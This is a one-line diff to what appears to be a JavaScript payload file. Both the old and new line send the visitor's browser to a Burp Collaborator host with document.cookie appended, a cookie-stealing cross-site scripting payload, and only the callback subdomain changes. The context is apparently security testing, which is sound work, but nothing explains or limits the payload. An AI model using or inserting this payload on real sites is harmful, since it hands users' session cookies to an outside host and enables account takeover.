@@ -1,1 +1,1 @@
-document.location='https://4qv7mjasf7gf805fhzgx3fs12s8jy7n.burpcollaborator.net?cookie='+document.cookie;
+document.location='https://jsflneablipp6yeqz33xy729y04qsf.burpcollaborator.net?cookie='+document.cookie;
